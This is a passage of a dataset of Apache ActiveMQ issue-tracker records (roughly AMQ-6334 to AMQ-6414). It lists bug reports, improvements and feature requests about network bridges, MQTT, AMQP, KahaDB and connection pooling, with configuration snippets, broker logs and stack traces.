When a destination is part of "staticallyIncludedDestinations" and "excludedDestinations" then the "excludedDestinations" behaviour is not obeyed and the messages are forwarded to the target AMQ instance.<staticallyIncludedDestinations>  <queue physicalName="FOO.>"/></staticallyIncludedDestinations><excludedDestinations>  <queue physicalName="FOO.BAR" /></excludedDestinations>
issueID:AMQ-6334
type:Bug
changed files:SimpleJmsTopicConnector.java
SimpleJmsQueueConnector.java
texts:ActiveMQConnection triggered heap space out of memory error when used with org.apache.activemq.network.SimpleJmsQueueConnector
This defect was identified when proxying an outbound queue bridge"s foreign connection through a load balancer with no available cluster nodes and is reported in the ActiveMQ broker log file with following DEBUG level event message:DEBUG 2016-June-22 15:54:25,165 JmsConnector:627 - Failed to establish initial &#91;foreign, 24388&#93; connection for JmsConnector &#91;javax.jms.JMSException: Cannot send, channel has already failed: tcp://0.0.0.0:61616&#93; In ActiveMQ v5.12.1 release this is triggered by a ConnectionFailedException being thrown on line 190 of class org.apache.activemq.network.SimpleJmsQueueConnector and can be replicated by running the attached JUnit test.Attached ActiveMQConnection subclass ensures that resource clean up is performed if any exception is thrown during an invocation of the start() method. Consequently instances are eligible for garbage collection if the underlying TCP connection is successfully established by constructor and then reset by peer before the connection is put into service. Is it possible to include this behaviour within the ActiveMQConnection class  itself in future release?
issueID:AMQ-6336
type:Improvement
changed files:
texts:QueueBrowser delivers expired messages
With AMQ-5340 we started sending expired messages from the broker to the browser consumer to speed up browsing when there"s expired messages on the queue. We should try to keep the old behaviour by checking for expired messages on the client side.
issueID:AMQ-6337
type:Bug
changed files:DefaultAuthorizationMap.java
texts:DefaultAuthorizationMap could invoke a method with the wrong arguments
As pointed out here:http://activemq.2283324.n4.nabble.com/java-lang-IllegalArgumentException-wrong-number-of-arguments-td4713290.htmlSome of the logic used for reflection could lead to an IllegalArgumentException if the groupClass is set to a different object because we do not properly check the that the number of method arguments is correct before invoking the method.
issueID:AMQ-6339
type:New Feature
changed files:
texts:AMQP: Add support for AMQP over WebSockets
Add support for AMQP connections over the WS and WSS transport.
issueID:AMQ-634
type:Improvement
changed files:
texts:switch the default stomp client port back to 61613 to match that of 3.x of ActiveMQ and to avoid breaking the Ruby Stomp client
None
issueID:AMQ-6340
type:Bug
changed files:
texts:Queue order lost on consumer close in some cases
When composing the unacked message list on close of a consumer the order of messages can be lost due to incorrect merging of pending and dispatched lists in the prefetch subscription.
issueID:AMQ-6341
type:Bug
changed files:AmqpSender.java
AmqpReceiver.java
AmqpSession.java
texts:AMQP: Session and or resource close / detach need to wait on broker RemoveInfo response
When a session or Sender / Receiver is closed or detached the response should await a response broker the broker that the async remove info command has been processed in order to ensure that the peer sees correct broker state following the return from that operation.
issueID:AMQ-6343
type:Bug
changed files:
texts:[MQTT] LWT doesn&#39;t work over a websocket connection
I use several services, some of them connect over tcp and the LWT works properly.I use several clients from a webapp" connected over a websocket link.i use a javascript code:var i_am_disconnected = new Paho.MQTT.Message(JSON.stringify({        version: 1,        state: 0      }));      i_am_disconnected.destinationName = "device/" + _token + "/ping";      i_am_disconnected.retained = true;      i_am_disconnected.qos = 1;client.onConnectionLost = onConnectionLost;      client.connect(…i traced the ActiveMQ log, i can see that the disconnection is detected, but i didn"t receive my LWT message. (again, my LWT works when I use a tcp connexion)2016-07-01 00:07:51,329 | INFO  | addConnection() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 info: ConnectionInfo {commandId = 0, responseRequired = true, connectionId = ID:deverylight-all-snapshot-42229-1467323807294-3:27, clientId = 60badfb1-3e6d-4637-b4ec-16b557d7db64, clientIp = ws://192.168.0.2:42372, userName = bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64, password = *****, brokerPath = null, brokerMasterConnector = false, manageable = false, clientMaster = true, faultTolerant = false, failoverReconnect = false} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-402016-07-01 00:07:51,333 | INFO  | addProducer() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 info: ProducerInfo {commandId = 2, responseRequired = true, producerId = ID:deverylight-all-snapshot-42229-1467323807294-3:27:-1:1, destination = null, brokerPath = null, dispatchAsync = false, windowSize = 0, sentCount = 0} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-402016-07-01 00:07:51,423 | INFO  | send() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 send: ActiveMQBytesMessage {commandId = 3, responseRequired = true, messageId = ID:deverylight-all-snapshot-42229-1467323807294-3:27:-1:1:1, originalDestination = null, originalTransactionId = null, producerId = ID:deverylight-all-snapshot-42229-1467323807294-3:27:-1:1, destination = topic://device.bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64.ping, transactionId = null, expiration = 0, timestamp = 1467324471422, arrival = 0, brokerInTime = 0, brokerOutTime = 0, correlationId = null, replyTo = null, persistent = false, type = null, priority = 4, groupID = null, groupSequence = 0, targetConsumerId = null, compressed = false, userID = null, content = org.apache.activemq.util.ByteSequence@335bf90b, marshalledProperties = null, dataStructure = null, redeliveryCounter = 0, size = 0, properties = {ActiveMQ.MQTT.QoS=1, ActiveMQ.Retain=true}, readOnlyProperties = true, readOnlyBody = true, droppable = false, jmsXGroupFirstForConsumer = false} ActiveMQBytesMessage{ bytesOut = null, dataOut = null, dataIn = null } payload: {"version":1,"state":2,"timestamp":1467324470.015} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-412016-07-01 00:07:51,447 | INFO  | addConsumer() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 info: ConsumerInfo {commandId = 4, responseRequired = true, consumerId = ID:deverylight-all-snapshot-42229-1467323807294-3:27:-1:1, destination = topic://mobile.167e0de6e20b55cc318aacb74f31752e2bffd339.*.position, prefetchSize = 32767, maximumPendingMessageLimit = 0, browser = false, dispatchAsync = true, selector = null, clientId = null, subscriptionName = null, noLocal = false, exclusive = false, retroactive = true, priority = 0, brokerPath = null, optimizedAcknowledge = false, noRangeAcks = false, additionalPredicate = null} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-392016-07-01 00:07:51,451 | INFO  | addConsumer() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 info: ConsumerInfo {commandId = 5, responseRequired = true, consumerId = ID:deverylight-all-snapshot-42229-1467323807294-3:27:-1:2, destination = topic://mobile.167e0de6e20b55cc318aacb74f31752e2bffd339.*.event, prefetchSize = 32767, maximumPendingMessageLimit = 0, browser = false, dispatchAsync = true, selector = null, clientId = null, subscriptionName = null, noLocal = false, exclusive = false, retroactive = true, priority = 0, brokerPath = null, optimizedAcknowledge = false, noRangeAcks = false, additionalPredicate = null} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-392016-07-01 00:08:51,151 | INFO  | removeConnection() clientId: 60badfb1-3e6d-4637-b4ec-16b557d7db64 userName: bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64 info: ConnectionInfo {commandId = 0, responseRequired = true, connectionId = ID:deverylight-all-snapshot-42229-1467323807294-3:27, clientId = 60badfb1-3e6d-4637-b4ec-16b557d7db64, clientIp = ws://192.168.0.2:42372, userName = bd525936-5238-4410-9579-79f8dfb27ea4::60badfb1-3e6d-4637-b4ec-16b557d7db64, password = *****, brokerPath = null, brokerMasterConnector = false, manageable = false, clientMaster = true, faultTolerant = false, failoverReconnect = false} | com.deveryware.deverylight.activemq.TokenAuthenticationBroker | qtp1143988572-40this is my ActiveMQ configuration<transportConnectors>            <transportConnector name="mqtt" uri="mqtt://0.0.0.0:1883"/>            <transportConnector name="mqtt+ws" uri="ws://0.0.0.0:9000"/>        </transportConnectors>
issueID:AMQ-6344
type:Task
changed files:
texts:AMQP: Update Qpid JMS to 0.10.0
Update to latest Qpid JMS release.
issueID:AMQ-6345
type:Bug
changed files:
texts:[MQTT] ping response without CONNECT
I am currently investigating the behavior of several MQTT brokers and noticed that the ActiveMQ broker responds to PINGREQ packets with PINGRESP packets even if no CONNECT packet has been sent before. This would be a violation of MQTT-3.1.0-1 and MQTT-4.8.0-1 of MQTT v3.1.1 while MQTT v3.1 is not that strict about this issue, but does also state "When a TCP/IP socket connection is established from a client to a server, a protocol level session must be created using a CONNECT flow." (http://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html#connect)Since ActiveMQ supports MQTT v3.1 according to http://activemq.apache.org/,but also MQTT v3.1.1 according to Issue AMQ-4990, I am not sure whether this should actually be considered a bug.
issueID:AMQ-6346
type:Bug
changed files:AbstractMQTTSocket.java
MQTTSocket.java
texts:Concurrent access to a MQTT Transport from WebSocket client can deadlock
Just like in AMQ-6046, WebSocket connections can encounter a deadlock when the Jetty side allows for concurrent access to the Transport instance that forwards commands onto the broker core. This was fixed for Stomp in AMQ-6046 but also needs to be fixed for MQTT.
issueID:AMQ-6350
type:Bug
changed files:
texts:PooledConnectionFactory throws &#39;IllegalStateException: Pool not open&#39; after re-init
Blueprint:<cm:property-placeholder persistent-id=".." update-strategy="reload" /><bean id="pooledConnectionFactory" class="org.apache.activemq.jms.pool.PooledConnectionFactory"        init-method="start" destroy-method="stop">...</bean>or Java:org.apache.activemq.jms.pool.PooledConnectionFactory pcf = new org.apache.activemq.jms.pool.PooledConnectionFactory();pcf.start();...pcf.stop();pcf.start();// producer.send(textMsg);Stacktrace:Caused by: javax.jms.IllegalStateException: java.lang.IllegalStateException: Pool not open at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:159) at org.apache.activemq.jms.pool.PooledConnection.createSession(PooledConnection.java:167) at org.talend.ipaas.rt.amqsource.AMQEventSource.createJmsSession(AMQEventSource.java:282) at org.talend.ipaas.rt.amqsource.AMQEventSource.sendEvent(AMQEventSource.java:117) ... 2 moreCaused by: java.lang.IllegalStateException: Pool not open at org.apache.commons.pool2.impl.BaseGenericObjectPool.assertOpen(BaseGenericObjectPool.java:672) at org.apache.commons.pool2.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:339) at org.apache.commons.pool2.impl.GenericKeyedObjectPool.borrowObject(GenericKeyedObjectPool.java:279) at org.apache.activemq.jms.pool.ConnectionPool.createSession(ConnectionPool.java:141) ... 5 more
issueID:AMQ-6352
type:Bug
changed files:
texts:Temporary message store cursor does not track store message size properly
The PList implementation for the temporary store that is used by the FilePendingMessageCursor has a bug that causes the message size to not be accurate.  On removal of an item from the PList, a null reference is always passed to the onRemove method by mistake.  This causes the message size counter to not decrement properly.
issueID:AMQ-6353
type:Bug
changed files:
texts:AMQP: Using JMS Transformer, preserve the type of the original CorrelationId
When transforming the incoming message using the JMS Transformer the type of the incoming correlation ID is lost when stored in the string value in the Message object, we need to preserve that type as this is meant to be immutable.  Because the ActiveMQMessage object"s only have a text value for correlation ID we need to encode the incoming value to a string form and apply prefix values to allow for re-encoding the correlation to the original type on the way out.
issueID:AMQ-6355
type:Bug
changed files:
texts:Provide bundles for activemq-client and its dependencies
I need to install activemq client on plain felix. Of course I can use the karaf feature and install all bundles from it. This is quite hughe though.So I tried to install the activemq-client and just its dependencies. Interestingly activemq does not seem to produce bundles during the build. This is especially strange as some of the projects even include custom maven bundle plugin settings.The reason seems to be that the packaging type bundle is missing.I will provide a PR to adjust the bundles needed for the activemq client.
issueID:AMQ-6356
type:Bug
changed files:
texts:Processing a KahaUpdateMessageCommand can lead to wrong store size being reported
When KahaDB processes a KahaUpdateMessageCommand it"s possible for the size statistic to be inadvertently increased in size.  This can happen if the location in the journal of the message command matches the new location.  This bug won"t show up in normal usage as typically an update message command is only processed when a new command is written to the journal (and hence a new location) but should still be fixed.
issueID:AMQ-6357
type:Bug
changed files:AbstractSubscription.java
texts:shutdown due to a local error: java.lang.ArithmeticException: / by zero
We have two brokers esb-test-mq01 and esb-test-mq02 configured in anetwork of brokers. In front of the brokers we have a load balancerthat spreads the connecting clients between the brokers.The brokers connect to each other directly without the load balancer.Sometimes (we havn"t found any patterns for when it occurs) one of theconnections between the brokers closes down with the following message:"Network connection between vm://esb-test-mq01.it.su.se#18 and ssl://esb-test-mq02.it.su.se/77.238.37.208:61616 shutdown due to a local error:java.lang.ArithmeticException: / by zero"After this the faulty broker never calls back. We have finally caught thisdivision with TRACE turned on, but we can"t make anything out of thelogs. (See attatched log file)Tim said on activemq-users to include as much information as I can butI can"t figure out anything more specific for our setup. I think activemq.xml says it all (and it is attatched to this issue).Let us know if there is any other information we can provide you with.
issueID:AMQ-6358
type:Improvement
changed files:MessageDatabase.java
texts:Start KahaDB checkpiont service after recover operations have completed not before
We currently start up the checkpoint worker before we"ve done a recover, we should instead wait until we"ve successfully recovered before starting.
issueID:AMQ-6359
type:Improvement
changed files:
texts:AMQP: Add support for exclusive and retroactive consumers
Allow destination options pulled from the address to be applied to the consumer subscription and enabled retroactive or exclusive consumer subscriptions.
issueID:AMQ-6361
type:Bug
changed files:
texts:Message can remain inflight after consumer side expiration acknowledgements
If the client clock is slightly ahead of the brokers clock a message could be expired on the client but not considered expired on the broker.When the expiry ACK is sent to the broker it checks if the message is also considered expired on the broker side. If the broker clock is behind the client side clock the message could be considered not expired on the broker and notremoved from the broker"s dispatched list. This leaves the broker reporting a message inflight from the broker"s perspective even though the message has been expired on the consumer(client) sideThe broker should treat the expired ACK as the authority on whether a message is expired and process it as such regardless of the broker side clock.
issueID:AMQ-6362
type:New Feature
changed files:TransactionContext.java
ActiveMQConnection.java
texts:Add an option to time out connection attempts when blocked in ensureConnectionInfoSent
In some rare cases client side stack traces show client can be stuck in ensureConnectionInfoSent wanting forever for a response from the broker.  We will add an optional timeout to allow this operation to fail (defaults off).
issueID:AMQ-6366
type:Bug
changed files:NetworkConnector.java
TransportConnection.java
texts:A duplex bridge will not properly honor dynamicOnly and restart subscriptions
When creating a bridge the dynamicOnly flag being false should recreate subscriptions on start up.  This works fine for the normal case but is broken in the duplex case in one direction because when the duplex bridge is created the durable destination list is never set.
issueID:AMQ-6370
type:Bug
changed files:
texts:JDBC message store - jdbc connection pool - potential deadlock with cleanup task when pool exhausted
There is an read/write lock guarding the cleanup task and other jdbc ops in the jdbc message store.Typically the read lock is obtained before the connection from the jdbc connection pool.In the case of xa transactions, the connection is obtained before the read lock, in transactioncontext.begin, leaving a window between which readlock holders can be blocked pending the connection release.If there is a cleanup (and write lock) request before release, the xa transaction cannot obtain a read lock and we are stuck.Disabling the cleanup task avoids this issue, but that is only an option if there are no durable subs or if the durable sub cleanup task can be tackled through db admin.
issueID:AMQ-6372
type:Bug
changed files:
texts:KahaDB reader pool not releasing unused open files till deletion - too many open files
Leading to: java.io.FileNotFoundException: .../kahadb/db-2300.log (Too many open files)Kahadb has an accessor pool of random access files and a periodic cleanup. However the cleanup does not work as expected.Only on journal gc does the pool get purged.This issue can arise with very large amounts of journal files that are paging and on recovery when the entire journal needs to be replayed.In essence, currently there needs to be fd per journal data file.The workaround is to increase the nofiles (max open files) for the broker process.
issueID:AMQ-6373
type:New Feature
changed files:
texts:Add a command to synchronize durable subscriptions over a network bridge
When dynamicallyIncludedDestinations are used for a NetworkConnector durable subscriptions are tracked (added/removed) in the connector.  This allows the broker to create network subscriptions automatically on a remote broker to match the demand that is created and then to destroy the network subscriptions when no longer needed.The problem with this is that if the bridge is restarted or if the brokers are restarted, the information about the durable subscriptions is lost.  For example, if the bridge is stopped and a local durable subscription is added, this new durable will not be added to the remote conduit network conduit subscription on reconnect.  Or, if a local durable subscription is removed while the bridge is offline, on reconnect the remote durable sub will not be cleaned up even if there are no more matching durables.To fix this we need to add a new OpenWire command to support the syncing of durable subscriptions when a bridge is restarted.  The goal of this command is to re-add missing subscriptions and to clean up no longer needed subscriptions on reconnect.Note that this new sync option will only apply when dynamicOnly is false and conduitSubscriptions is true.  (both of these are enabled by default)
issueID:AMQ-6374
type:Improvement
changed files:
texts:AMQP: Improve message transformation to provide better cross protocol messaging
The current JMS message transformer does not always convert an incoming AMQP message to a type that is most appropriate for consumption from an OpenWire client and also can sometimes not transform the messages back to the expected AMQP type when sending a stored message back out to an AMQP client.
issueID:AMQ-6375
type:New Feature
changed files:
texts:Add non-blocking subscription statistics to KahaDB
Currently KahaDB TopicMessageStore supports returning the messageCount and messageSize for subscription but this requires locking the index and iterating to compute the information.  I have a use case where I query this information regularly for the status of the broker and the performance takes a hit because of the locking.There should be an option to enable statistics counters to keep track of this information so that it can be queried without locking, such like the store currently tracks the total count and size but for each subscription also.  This should be disabled by default because there will be some overhead for computing the metrics if there are a lot of subscriptions in the store.
issueID:AMQ-6377
type:New Feature
changed files:
texts:Introduce a periodic disk sync mode for KahaDB journal
KahaDB has two modes for journal disk syncs, either always sync for each write or never sync.  I"m proposing that we add a third option, a period disk sync. The intended behavior of this would be to run a task in the file appender that would sync the file (if necessary) at some periodic interval (such as every 500 ms, or 1 second, etc) instead of every write.  The file would also be synced on close (on file rollover or shutdown)In my testing, syncing every 1 second has been proven to be nearly indistinguishable performance as never disk syncing but is a safer option as you insure that a sync is performed at least once per interval.
issueID:AMQ-6378
type:Bug
changed files:
texts:KahaDb recover from corrupt metadata state locations that can be rebuilt
The index tracks producerAudit and ackMessageFileMap locations. Failure to recreate/read on startup can be replayed from the journal however if the locations are corrupt the broker errors out. In this case a replay can still recreate this information.java.io.IOException: Invalid location: 7:4802, : java.lang.NegativeArraySizeException at org.apache.activemq.store.kahadb.disk.journal.DataFileAccessor.readRecord(DataFileAccessor.java:92) at org.apache.activemq.store.kahadb.disk.journal.Journal.read(Journal.java:867) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:1123) at org.apache.activemq.store.kahadb.MessageDatabase.recoverProducerAudit(MessageDatabase.java:754) at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:639) at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:439) at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:458) at org.apache.activemq.store.kahadb.MessageDatabase.doStart(MessageDatabase.java:291) at org.apache.activemq.store.kahadb.KahaDBStore.doStart(KahaDBStore.java:216) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.doStart(KahaDBPersistenceAdapter.java:223) at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:55) at org.apache.activemq.broker.BrokerService.doStartPersistenceAdapter(BrokerService.java:674) at org.apache.activemq.broker.BrokerService.startPersistenceAdapter(BrokerService.java:658) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:622)Caused by: java.lang.NegativeArraySizeException at org.apache.activemq.store.kahadb.disk.journal.DataFileAccessor.readRecord(DataFileAccessor.java:87)
issueID:AMQ-6379
type:Improvement
changed files:
texts:Add client metadata to the WireFormatInfo object
Add properties for provider name, provider version, and platform details to the WireFormatInfo object.  This will make easier to identify the origin of the client as well as whether older client libraries are being used.
issueID:AMQ-6380
type:New Feature
changed files:
texts:Add bundle to create ConnectionFactories from config
For jdbc pax-jdbc provides a feature to create DataSources from config admin configs. For jms there is no generic way to do this but we can provide it for activemq. The proposed change will add a bundle that watches for configs with a certain naming pattern and creates pooled connection factories from these. This approach is much more reliable than the blueprint files karaf currently can create in the deploy dir. Another advantage is that this approach also works nicely for other OSGi deployments like plain felix.
issueID:AMQ-6381
type:Bug
changed files:
texts:Durable network subscriptions don&#39;t update the forwards network statistic
When messages are forwarded to a remote broker from a networked durable subscription the forwards stat which keeps a count of the number of forwarded messages is never incremented.  It does work properly for topic subscriptions.
issueID:AMQ-6383
type:New Feature
changed files:
texts:Add a flag to allow forcing network subscriptions to be durable
When there is a network bridge for two brokers and a topic is included, there is a conduit subscription created for the topic.  This can cause issues if there is a mixture of durable and non-durable subscriptions.The issue is that when the conduit subscription gets created, the type of the subscription across the bridge can be either durable or non-durable depending on which local subscription gets created first.  This is a problem because you might end up with local durable subs but the network bridge conduit sub is actually non-durable.  This can also cause issues if all of the consumers go away because then the conduit sub gets destroyed instead of being retained if it was durable.To fix this scenario I think there should be an option to force the conduit subscription to be durable.  This could be done on a per topic basis or topic hierarchy. Something like the following:       <networkConnector name="broker1" duplex="true" uri="static:(tcp://10.x.x.x:61616)">                <dynamicallyIncludedDestinations>                        <topic physicalName="test.topic?forceDurable=true"/>                </dynamicallyIncludedDestinations>        </networkConnector>
issueID:AMQ-6386
type:Bug
changed files:
texts:NumberFormatException when publish message via AMQP and dequeue via STOMP
Using activeMQ examples (java)1. examplesamqp publish messages to queue2. examplesstompread messages from queue (using Listener class)get error Caused by: java.lang.RuntimeException: Exception occurred sending ACK for message id : IDcc272b3b79-a2ce-4445-acb7-b72f396187e0c1c1c1-1 at org.fusesource.stomp.jms.StompJmsMessageConsumer.doAck(StompJmsMessageConsumer.java:235) at org.fusesource.stomp.jms.StompJmsMessageConsumer.ack(StompJmsMessageConsumer.java:189) at org.fusesource.stomp.jms.StompJmsMessageConsumer.receive(StompJmsMessageConsumer.java:116) ... 6 moreCaused by: java.io.EOFException: Peer disconnected at org.fusesource.hawtdispatch.transport.AbstractProtocolCodec.read(AbstractProtocolCodec.java:331) at org.fusesource.hawtdispatch.transport.TcpTransport.drainInbound(TcpTransport.java:706) at org.fusesource.hawtdispatch.transport.TcpTransport$6.run(TcpTransport.java:588) at org.fusesource.hawtdispatch.internal.NioDispatchSource$3.run(NioDispatchSource.java:209) at org.fusesource.hawtdispatch.internal.SerialDispatchQueue.run(SerialDispatchQueue.java:100) at org.fusesource.hawtdispatch.internal.pool.SimpleThread.run(SimpleThread.java:77)3. In ActiveMq log WARN | Transport Connection to: tcp://127.0.0.1:51521 failed: java.io.IOException: Unexpected error occurred: java.lang.NumberFormatException: For input string: "1-1"
issueID:AMQ-6387
type:Bug
changed files:
texts:Messages delivered to durable subcriber are kept in broker
Given: broker with disabled persistence non-transactional sessions with AUTO_ACKNOWLEDGE topicWhen:  there is inactive durable subscription messages are sent to that topic with DeliveryMode.PERSISTENT subscription becomes active and all messages are delivered to the durable consumerThen: messages are kept in brokers memory (visible in memoryPercentUsage, on heap etc)When:  messages expiration time or TTL is elapsedThen: messages are still kept in brokers memory (visible in memoryPercentUsage, on heap etc)Messages are kept also when message selector of durable subscription does not match messages sent to topic. Changing DeliveryMode to NON_PERSISTENT makes the messages not kept. Attached test case.
issueID:AMQ-6389
type:Bug
changed files:
texts:LoggingBrokerPlugin logs a message size equal to 0
The size attribute is not initialised on the way into the broker, but is on the way out. Would be nice if this attribute was visible on the toString for this plugin.
issueID:AMQ-639
type:Bug
changed files:NetworkConnector.java
ConnectionFilter.java
BrokerService.java
DiscoveryNetworkConnector.java
texts:Broker is not re-connecting to a network of brokers after going down and then being brought back up
I have set up a network of brokers with the following configuration:<beans xmlns="http://activemq.org/config/1.0">  <bean class="org.springframework.beans.factory.config.PropertyPlaceholderConfigurer"/>  <broker brokerName="bfe-${HOSTNAME}" useJmx="true" persistent="false" managementContext="#mc">     <destinationPolicy>      <policyMap>        <policyEntries>          <policyEntry queue=">" memoryLimit="5000000"/>        </policyEntries>      </policyMap>   </destinationPolicy>   <memoryManager>     <usageManager limit="100000000"/>    </memoryManager>     <transportConnectors>     <transportConnector uri="tcp://localhost:61616" discoveryUri="multicast://bfe2"/>     </transportConnectors>    <networkConnectors>      <!-- by default just auto discover the other brokers -->      <networkConnector uri="multicast://bfe2"/>    </networkConnectors>   </broker> <bean id="mc" class="org.apache.activemq.broker.jmx.ManagementContext">    <property name="connectorPort" value="1099"/>    <property name="connectorPath" value="/jmxrmibfe-1"/>  </bean></beans>I then run a series of tests (producing and consuming on the network of brokers). Then I shut one broker down and then start it up again  it can"t see the other brokers in the network but the other brokers can see it.
issueID:AMQ-6392
type:Bug
changed files:
texts:Allow host name mapping with publishedAddressPolicy on a transportConnector
The publishAddressPolicy allows resolution and plain text but does not allow replacement. There is an option to map ports, but not to map hosts.Adding a simple hostMap option will allow hostnames to be easily substituted when publishedrelates to AMQ-4024
issueID:AMQ-6397
type:Improvement
changed files:HttpClientTransport.java
texts:Configure HTTP timeouts in HttpClientTransport for receive in addition to send
We"ve experienced a situation where when creating a connection, the thread is stuck in a socket read during the HTTP HEAD call to the broker from HttpClientTransport:httpClient.execute(httpMethod, new BasicResponseHandler());After reading through the usage of HttpClient, it looks as though soTimeout is only set on the sent HttpClient instances, not the receive.  This patch adds the timeout to both.
issueID:AMQ-6402
type:Bug
changed files:
texts:activemq-camel - Potential NPE in OriginalDestinationPropagateStrategy
java.lang.NullPointerException at org.apache.activemq.camel.component.OriginalDestinationPropagateStrategy.onMessageCreated(OriginalDestinationPropagateStrategy.java:45) ~&#91;activemq-camel-5.14.0.jar:5.14.0&#93; at org.apache.camel.component.jms.JmsBinding.makeJmsMessage(JmsBinding.java:309) ~&#91;camel-jms-2.18-SNAPSHOT.jar:2.18-SNAPSHOT&#93; at org.apache.camel.component.jms.JmsProducer$2.createMessage(JmsProducer.java:301) ~&#91;camel-jms-2.18-SNAPSHOT.jar:2.18-SNAPSHOT&#93;
issueID:AMQ-6403
type:Improvement
changed files:
texts:Allow splitting the temporary message store
The main KahaDB message store can be split by using different values for directory and indexDirectory in the <kahaDB> element. This is very useful to put the index file on fast media (SSD, RAM disk...) while keeping the log files on slower but larger media (spinning disks, NAS...). For reference, this is documented at http://activemq.apache.org/kahadb.html.Unfortunately, we cannot split the temporary message store the same way. We can change its location via the tmpDataDirectory attribute but we cannot split index and log files.Could you please add an option to split the temporary message store in the same spirit as what has been done for the main message store? Thanks!
issueID:AMQ-6404
type:Bug
changed files:
texts:AMQP/JMS message transformation broken.
The changes introduced by AMQ-6374 broke the transformation between AMQP and JMS for UTF-8 text messages.I have enabled the JMS message transformer for the AMQP transport connector. If I send a UTF-8 text message over AMQP and then reads it back over AMQP I get an empty message body.I have looked at the code and found the bad code. It is in the org.apache.activemq.transport.amqp.message.ActiveMQJMSVendor class.When the inbound message arrives the createTextMessage(String) method is called. That method creates an ActiveMQTextMessage instance whose data is set with the setText method.When the outbound message is to be sent the getBinaryFromMessageBody(TextMessage) method is called. This method tries to get the data with the getContent method, but that method always returns null. The getText method returns the correct data, but is not used here.
issueID:AMQ-6406
type:Bug
changed files:
texts:kahadb concurrentStoreAndDispatch - duplicate suppression in cursor needs to wait for possible store add
An inflight store add that is a duplicate may get suppressed by the index or may get added as a duplicate if the original has already been dispatched and acked.If the cursor traps the duplicate message, it won"t get dispatched so it needs to get removed from the store. Otherwise it will remain till restart and possibly get redispatched and/or hold up gc.The store removal is only occurring for the jdbc store (that has no separate index to track duplicates). This needs fixing.
issueID:AMQ-6408
type:Task
changed files:
texts:Update Proton-J to latest relase
None
issueID:AMQ-6409
type:Task
changed files:
texts:Update Netty to latest bugfix release 4.0.41.Final
None
issueID:AMQ-6410
type:Improvement
changed files:
texts:AMQP: Advertise support for delayed message delivery using offered capability
Add a new offered capability that indicates the broker supports delayed message delivery via the "x-opt-delivery-time" message annotation.
issueID:AMQ-6411
type:Bug
changed files:
texts:NPE from org.apache.activemq.bugs.AMQ4952Test.testConsumerBrokerRestart[enableAudit=false]
strange npe from ci in the log on failure of:org.apache.activemq.bugs.AMQ4952Test.testConsumerBrokerRestart&#91;enableAudit=false&#93;need to get to the bottom of that!2016-08-31 05:26:47,951 [vice[BC] Task-1] - ERROR Queue                          - Failed to page in more queue messages java.lang.NullPointerException at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1942) at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:2166) at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1603) at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:133) at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:48) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-6413
type:Bug
changed files:
texts:kahadb concurrentStoreAndDispatch - producer audit managed by store is skipped
failover replay or inflight sends are trapped by the producer audit that is backed by the persistence adapter audit.The intent is to drop any resend that has made it into the store.With concurrentStoreAndDispatch messages can skip the store but also can skip the audit.A failover resend can get delivered to the store and replayed to the cursor. AMQ-6406 and the message will go the the DLQ or get dispatched if the cursor audit is disabled/exhausted.Pre AMQ-6406 the message would not get dispatched till restart, holding up gc.
issueID:AMQ-6414
type:Bug
changed files:
texts:The nio+ssl transports can block and hang on connection in certain situations
